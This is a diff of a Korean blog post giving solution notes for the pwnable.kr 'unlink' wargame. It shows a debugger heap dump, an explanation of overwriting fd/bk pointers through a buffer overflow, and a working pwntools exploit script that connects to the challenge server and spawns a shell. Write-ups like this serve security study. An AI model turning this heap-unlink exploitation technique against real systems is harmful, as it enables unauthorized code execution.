@@ -172,7 +172,7 @@ ecx-0x4의 값을 esp로 넣고 있다.</p>
 <li>esi = esp</li>
 </ol>
 <p>즉 ebp-4을 찾아야 한다.</p>
-<h2 id="풀이3">2019-08-28 풀이3</h2>
+<h2 id="풀이3">2019-08-28~ 풀이3</h2>
 <pre><code>EAX  0x9d9f578 ◂— 'AAAAAAAA'
 here is stack address leak: 0xffa83bc4
 here is heap address leak: 0x9d9f570
@@ -188,23 +188,37 @@ $1 = (void *) 0xffa83bd4
 !  : A의 주소
 ? : ebp-4
 </code></pre>
-<p>A의 주소에서 ebp-4까지의 거리는 10byte이다.</p>
-<h2 id="풀이4">2019 -08-29 풀이4</h2>
-<pre><code>0x9884578 ◂— 'AAAAAAAAA'
-Ahere is stack address leak: 0xffd87254
-here is heap address leak: 0x9884570
-pwndbg&gt; x/50x 0x9884550
-0x9884550:	0x00000000	0x00000000	0x00000000	0x00000000
-0x9884560:	0x00000000	0x00000000	0x00000000	0x00000021
-0x9884570: !0x09884590!	0x00000000	0x41414141	0x41414141
-0x9884580:	0x00000041	0x00000000	0x00000000	0x00000021
-0x9884590:	0x098845b0	0x09884570	0x00000000	0x00000000
-0x98845a0:	0x00000000	0x00000000	0x00000000	0x00000021
-0x98845b0:	0x00000000	0x09884590	0x00000000	0x00000000
-0x98845c0:	0x00000000	0x00000000	0x00000000	0x00000411
-0x98845d0:	0x20776f6e	0x74616874	0x756f7920	0x76616820
-0x98845e0:	0x656c2065	0x2c736b61	0x74656720	0x65687320
-0x98845f0:	0x0a216c6c	0x000a340a	0x00000000	0x00000000
-0x9884600:	0x00000000	0x00000000	0x00000000	0x00000000
+<p>A의 주소에서 ebp-4까지의 거리는 16byte이다. 하지만 버퍼에 쉘코드를 넣을 예정이기에<br>
+쉘코드(4byte) + 12byte 가 된다.</p>
+<h2 id="풀이4">2019-09-04~ 풀이4</h2>
+<p>풀이</p>
+<ul>
+<li>ebp-4에 넣은 값은 main() 후에 실행된다.</li>
+<li>ebp-4에 값을 직접적으로 넣을 순 없다.</li>
+<li>따라서 unlink()함수를 통해 바뀌는 fd와 bk를 조작하여 버퍼를 호출하게 해야한다.</li>
+<li>그 전에 BOF를 통해 fd와 bk의 값을 변경 할 수 있다.</li>
+</ul>
+<p>.</p>
+<pre><code>from pwn import *
+ssh = ssh("unlink", "pwnable.kr", port = 2222, password = "guest")
+s = ssh.process("/home/unlink/unlink")
+e = ELF('./unlink')
+
+shellfunc = e.sym.shell
+
+s.recvuntil(": ")
+StackAdd = int(s.recv(10), 16)
+s.recvuntil(": ")
+HeapAdd = int(s.recv(10), 16)
+
+payload = ''
+payload += p32(shellfunc)
+payload += 'A'*12
+
+payload += p32(HeapAdd + 12)
+payload += p32(StackAdd + 16)
+
+s.send(payload)
+s.interactive()
 </code></pre>
 
